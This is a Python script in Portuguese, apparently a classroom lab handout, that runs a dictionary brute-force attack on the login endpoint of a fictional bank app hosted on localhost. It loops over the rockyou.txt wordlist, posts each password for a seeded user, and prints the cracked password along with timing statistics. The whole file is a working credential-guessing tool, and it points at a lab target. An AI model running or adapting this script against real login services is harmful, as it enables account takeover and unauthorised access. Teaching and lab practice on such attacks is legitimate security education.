#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Apostila Prática - UC11 (Aula 21/09)
Script: Força Bruta / Ataque de Dicionário em Endpoint de Login
Alvo: NexusBank Corporate
"""

import os
import sys
import time
import requests

# ==============================================================================
# 1. CONFIGURAÇÕES DO ALVO E DO ARQUIVO
# ==============================================================================
# Troque pelo IP do professor se estiver em outra máquina na rede do laboratório
URL_ALVO = "http://127.0.0.1:8002/login"

# Usuário de teste da aplicação (seed da aula: ana, bruno, admin)
USUARIO_ALVO = "ana"

# Nome do arquivo de wordlist
ARQUIVO_WORDLIST = "rockyou.txt"


# ==============================================================================
# 2. VALIDAÇÃO DO AMBIENTE
# ==============================================================================
if not os.path.exists(ARQUIVO_WORDLIST):
    print(f"[!] Arquivo de wordlist '{ARQUIVO_WORDLIST}' não foi encontrado na pasta atual.")
    print("    Certifique-se de que o arquivo está na mesma pasta do script.")
    sys.exit(1)


# ==============================================================================
# 3. EXECUÇÃO DO ATAQUE DE DICIONÁRIO
# ==============================================================================
print("=" * 65)
print("   INICIANDO TESTE DE FORÇA BRUTA (ATAQUE DE DICIONÁRIO)")
print("=" * 65)
print(f" Alvo       : {URL_ALVO}")
print(f" Usuário    : {USUARIO_ALVO}")
print(f" Wordlist   : {ARQUIVO_WORDLIST}")
print("=" * 65)

tentativas = 0
senha_encontrada = None
tempo_inicio = time.time()

# Abre o arquivo linha a linha (não sobrecarrega a memória RAM)
# encoding='latin-1' e errors='ignore' evitam erros comuns na rockyou.txt
with open(ARQUIVO_WORDLIST, "r", encoding="latin-1", errors="ignore") as arquivo:
    for linha in arquivo:
        # Remove espaços em branco e o caractere de quebra de linha (\n)
        senha = linha.strip()

        # Pula eventuais linhas vazias
        if not senha:
            continue

        tentativas += 1

        # Monta a carga de dados (payload) em formato de dicionário
        payload = {
            "usuario": USUARIO_ALVO,
            "senha": senha
        }

        try:
            # Envia a requisição HTTP POST com corpo JSON
            resposta = requests.post(URL_ALVO, json=payload, timeout=5)

            # Analisa o código de retorno da API
            if resposta.status_code == 200:
                senha_encontrada = senha
                print(f"[+] [TENTATIVA {tentativas:04d}] >>> SUCESSO! Senha correta: '{senha}' <<<")
                break
            elif resposta.status_code == 401:
                print(f"[-] [TENTATIVA {tentativas:04d}] Senha: '{senha}' -> Incorreta (401)")
            else:
                print(f"[?] [TENTATIVA {tentativas:04d}] Senha: '{senha}' -> Status inesperado: {resposta.status_code}")

        except requests.exceptions.RequestException as erro:
            print(f"\n[!] Falha de comunicação com o servidor: {erro}")
            print("[!] Verifique se o servidor do laboratório está ligado.")
            break

tempo_total = time.time() - tempo_inicio

# ==============================================================================
# 4. RELATÓRIO FINAL
# ==============================================================================
print("\n" + "=" * 65)
print("   RESUMO DA EXECUÇÃO")
print("=" * 65)
print(f" Total de tentativas realizadas : {tentativas}")
print(f" Tempo total de execução       : {tempo_total:.2f} segundos")

if tempo_total > 0:
    velocidade = tentativas / tempo_total
    print(f" Velocidade média               : {velocidade:.1f} requisições/segundo")

if senha_encontrada:
    print(f" Resultado                      : SENHA LOCALIZADA -> '{senha_encontrada}'")
else:
    print(" Resultado                      : Senha não encontrada na wordlist testada.")
print("=" * 65)
